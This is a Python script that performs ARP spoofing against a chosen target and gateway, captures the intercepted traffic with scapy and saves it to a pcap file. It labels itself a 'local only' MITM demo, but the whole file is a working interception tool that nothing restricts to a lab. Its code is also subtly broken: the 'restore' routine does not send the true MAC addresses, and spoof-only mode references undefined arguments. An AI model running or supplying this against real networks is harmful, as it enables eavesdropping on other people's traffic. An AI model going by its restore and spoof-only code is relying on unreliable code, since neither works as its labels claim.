#!/usr/bin/env python3
"""
N12 - Traffic Redirector
ARP spoofing simulation, traffic capture, and MITM demo (local only).
Uses scapy for packet crafting and manipulation.
"""

import os
import sys
import time
import signal
import argparse
import threading
import struct
from collections import defaultdict

try:
    from scapy.all import (ARP, Ether, IP, TCP, UDP, ICMP, DNS, Raw,
                           send, sendp, sniff, srp, get_if_hwaddr,
                           conf, wrpcap)
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class TrafficRedirector:
    """ARP spoofing simulation and traffic capture for local testing."""

    def __init__(self, interface=None):
        self.interface = interface
        self.target_ip = None
        self.gateway_ip = None
        self.target_mac = None
        self.gateway_mac = None
        self.local_mac = None
        self.running = False
        self.packets_captured = []
        self.traffic_stats = defaultdict(int)
        self.lock = threading.Lock()

        if SCAPY_AVAILABLE and self.interface:
            conf.iface = self.interface

    def get_local_info(self):
        """Get local MAC and IP address."""
        import socket
        import subprocess
        import re

        local_ip = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            local_ip = s.getsockname()[0]
            s.close()
        except OSError:
            local_ip = '127.0.0.1'

        local_mac = None
        if SCAPY_AVAILABLE:
            try:
                local_mac = get_if_hwaddr(self.interface or conf.iface)
            except Exception:
                pass

        if not local_mac:
            try:
                iface = self.interface or 'eth0'
                result = subprocess.run(
                    ['ip', 'link', 'show', iface],
                    capture_output=True, text=True, timeout=5)
                match = re.search(r'link/ether\s+([0-9a-fA-F:]{17})',
                                  result.stdout)
                if match:
                    local_mac = match.group(1).upper()
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass

        return local_ip, local_mac

    def resolve_mac(self, ip):
        """Resolve IP to MAC address."""
        if not SCAPY_AVAILABLE:
            return self._resolve_mac_arp(ip)

        try:
            arp = ARP(pdst=ip)
            ether = Ether(dst='ff:ff:ff:ff:ff:ff')
            result = srp(ether / arp, timeout=3, verbose=0)[0]
            if result:
                return result[0][1].hwsrc.upper()
        except Exception:
            pass
        return self._resolve_mac_arp(ip)

    def _resolve_mac_arp(self, ip):
        """Resolve MAC using system ARP table."""
        import subprocess
        import re
        try:
            result = subprocess.run(
                ['arp', '-n', ip],
                capture_output=True, text=True, timeout=5)
            match = re.search(
                r'([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})',
                result.stdout)
            if match:
                return match.group(1).upper()
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return None

    def setup(self, target_ip, gateway_ip):
        """Set up ARP spoofing parameters."""
        if not SCAPY_AVAILABLE:
            print("[-] scapy not available. Install: pip install scapy")
            return False

        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

        print(f"[*] Resolving MAC addresses...")
        self.target_mac = self.resolve_mac(target_ip)
        self.gateway_mac = self.resolve_mac(gateway_ip)
        _, self.local_mac = self.get_local_info()

        if not self.target_mac:
            print(f"[-] Could not resolve MAC for target {target_ip}")
            return False
        if not self.gateway_mac:
            print(f"[-] Could not resolve MAC for gateway {gateway_ip}")
            return False

        print(f"    Target:   {target_ip} -> {self.target_mac}")
        print(f"    Gateway:  {gateway_ip} -> {self.gateway_mac}")
        print(f"    Local:    {self.local_mac}")
        return True

    def arp_spoof(self, target_ip, target_mac, spoof_ip, count=3):
        """Send spoofed ARP replies to target."""
        if not SCAPY_AVAILABLE:
            return

        packet = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        send(packet, count=count, verbose=0)

    def arp_restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Restore ARP tables by sending correct replies."""
        if not SCAPY_AVAILABLE:
            return

        print(f"[*] Restoring ARP tables...")
        self.arp_spoof(target_ip, target_mac, gateway_ip, count=5)
        self.arp_spoof(gateway_ip, gateway_mac, target_ip, count=5)
        print(f"[+] ARP tables restored")

    def spoof_loop(self):
        """Continuous ARP spoofing loop."""
        while self.running:
            try:
                self.arp_spoof(self.target_ip, self.target_mac,
                               self.gateway_ip, count=2)
                self.arp_spoof(self.gateway_ip, self.gateway_mac,
                               self.target_ip, count=2)
                self.traffic_stats['spoof_packets'] += 4
            except Exception:
                pass
            time.sleep(2)

    def packet_callback(self, pkt):
        """Callback for captured packets."""
        with self.lock:
            self.packets_captured.append(pkt)

            if pkt.haslayer(IP):
                src = pkt[IP].src
                dst = pkt[IP].dst
                self.traffic_stats['ip_packets'] += 1

                if pkt.haslayer(TCP):
                    self.traffic_stats['tcp'] += 1
                    sport = pkt[TCP].sport
                    dport = pkt[TCP].dport
                    flags = str(pkt[TCP].flags)
                    if 'S' in flags:
                        self.traffic_stats['syn'] += 1
                    if 'R' in flags:
                        self.traffic_stats['rst'] += 1

                elif pkt.haslayer(UDP):
                    self.traffic_stats['udp'] += 1
                    if pkt.haslayer(DNS):
                        self.traffic_stats['dns'] += 1

                elif pkt.haslayer(ICMP):
                    self.traffic_stats['icmp'] += 1

                if pkt.haslayer(Raw):
                    payload = pkt[Raw].load
                    self.traffic_stats['bytes'] += len(payload)

                    if len(self.packets_captured) % 50 == 0:
                        preview = payload[:50]
                        print(f"    [CAPTURED] {src}:{sport if 'sport' in dir() else '?'} "
                              f"-> {dst}:{dport if 'dport' in dir() else '?'} "
                              f"({len(payload)}B)")

    def capture_traffic(self, duration=None, bpf_filter=None):
        """Capture traffic on the network."""
        if not SCAPY_AVAILABLE:
            print("[-] scapy not available")
            return

        print(f"[*] Starting packet capture...")
        if bpf_filter:
            print(f"    Filter: {bpf_filter}")

        try:
            iface = self.interface or conf.iface
            if duration:
                sniff(iface=iface, prn=self.packet_callback,
                      timeout=duration, filter=bpf_filter, store=1)
            else:
                sniff(iface=iface, prn=self.packet_callback,
                      filter=bpf_filter, store=1)
        except PermissionError:
            print("[-] Capture requires root privileges (sudo)")
        except KeyboardInterrupt:
            print("\n[!] Capture stopped")

    def start_mitm(self, target_ip, gateway_ip, capture_filter=None,
                   duration=None):
        """Full MITM demo: ARP spoof + capture."""
        if not self.setup(target_ip, gateway_ip):
            return

        self.running = True
        print(f"\n[*] Starting MITM simulation...")
        print(f"    Target:  {target_ip}")
        print(f"    Gateway: {gateway_ip}")
        print(f"    Duration: {'unlimited' if not duration else f'{duration}s'}")

        spoof_thread = threading.Thread(target=self.spoof_loop,
                                        daemon=True)
        spoof_thread.start()
        print(f"[+] ARP spoofing started")

        capture_thread = threading.Thread(
            target=self.capture_traffic,
            args=(duration, capture_filter),
            daemon=True)
        capture_thread.start()

        try:
            capture_thread.join()
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            time.sleep(2)
            self.arp_restore(target_ip, self.target_mac,
                             gateway_ip, self.gateway_mac)
            self.print_stats()

    def print_stats(self):
        """Print capture statistics."""
        print(f"\n{'='*50}")
        print(f"  TRAFFIC CAPTURE STATISTICS")
        print(f"{'='*50}")
        print(f"  Total packets captured: {len(self.packets_captured)}")
        print(f"  Spoof packets sent:     "
              f"{self.traffic_stats.get('spoof_packets', 0)}")
        print(f"  IP packets:             {self.traffic_stats.get('ip_packets', 0)}")
        print(f"  TCP:                    {self.traffic_stats.get('tcp', 0)}")
        print(f"    SYN:                  {self.traffic_stats.get('syn', 0)}")
        print(f"    RST:                  {self.traffic_stats.get('rst', 0)}")
        print(f"  UDP:                    {self.traffic_stats.get('udp', 0)}")
        print(f"  DNS:                    {self.traffic_stats.get('dns', 0)}")
        print(f"  ICMP:                   {self.traffic_stats.get('icmp', 0)}")
        print(f"  Total bytes:            {self.traffic_stats.get('bytes', 0)}")
        print(f"{'='*50}")

    def save_capture(self, filepath):
        """Save captured packets to pcap file."""
        if self.packets_captured and SCAPY_AVAILABLE:
            wrpcap(filepath, self.packets_captured)
            print(f"[+] Saved {len(self.packets_captured)} packets to {filepath}")
        else:
            print("[-] No packets to save")


def main():
    parser = argparse.ArgumentParser(
        description='N12 — Traffic Redirector (MITM demo, local only)')
    parser.add_argument('--target', '-t', required=True,
                        help='Target IP address')
    parser.add_argument('--gateway', '-g', required=True,
                        help='Gateway IP address')
    parser.add_argument('--interface', '-i',
                        help='Network interface')
    parser.add_argument('--duration', '-d', type=int,
                        help='Capture duration in seconds')
    parser.add_argument('--filter', '-f',
                        help='BPF capture filter')
    parser.add_argument('--save', '-s',
                        help='Save capture to pcap file')
    parser.add_argument('--spoof-only', action='store_true',
                        help='Only spoof, do not capture')

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[-] This tool requires root privileges (sudo)")
        sys.exit(1)

    print("╔═══════════════════════════════════════╗")
    print("║     N12 — Traffic Redirector          ║")
    print("║     MITM Demo (local only)            ║")
    print("╚═══════════════════════════════════════╝")

    if not SCAPY_AVAILABLE:
        print("[-] scapy is required: pip install scapy")
        sys.exit(1)

    redirector = TrafficRedirector(args.interface)

    if args.spoof_only:
        if not redirector.setup(args.target, args.gateway):
            sys.exit(1)
        print(f"[*] Spoofing only mode")
        try:
            while True:
                redirector.arp_spoof(args.target, redirector.target_mac,
                                     args.gateway_ip, count=2)
                redirector.arp_spoof(args.gateway, redirector.gateway_mac,
                                     args.target_ip, count=2)
                time.sleep(2)
        except KeyboardInterrupt:
            redirector.arp_restore(args.target, redirector.target_mac,
                                   args.gateway, redirector.gateway_mac)
    else:
        redirector.start_mitm(args.target, args.gateway,
                              args.filter, args.duration)
        if args.save:
            redirector.save_capture(args.save)


if __name__ == '__main__':
    main()
